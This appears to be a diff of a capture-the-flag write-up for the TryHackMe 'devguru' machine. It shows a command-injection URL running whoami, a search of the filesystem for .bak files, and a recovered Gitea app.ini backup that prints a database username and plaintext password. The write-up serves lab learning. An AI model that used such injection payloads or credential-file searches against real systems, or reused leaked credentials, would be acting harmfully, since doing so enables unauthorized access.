@@ -100,4 +100,32 @@ http://devguru.thm/about?cmd=whoami
 ```
 find / -name *.bak 2>/dev/null | tee /dev/shm/log.txt
 ```
+### There seems to be an app.ini.bak in /var/backups
+### 
+```
+cat app.ini.bak | grep data -C 10
+
+
+[database]
+; Database to use. Either "mysql", "postgres", "mssql" or "sqlite3".
+DB_TYPE             = mysql
+HOST                = 127.0.0.1:3306
+NAME                = gitea
+USER                = gitea
+; Use PASSWD = `your password` for quoting if you use special characters in the password.
+PASSWD              = UfFPTF8C8jjxVF2m
+; For Postgres, schema to use if different from "public". The schema must exist beforehand,
+; the user must have creation privileges on it, and the user search path must be set
+; to the look into the schema first. e.g.:ALTER USER user SET SEARCH_PATH = schema_name,"$user",public;
+SCHEMA              = 
+```
+
+
+
+
+
+
+
+
+
 
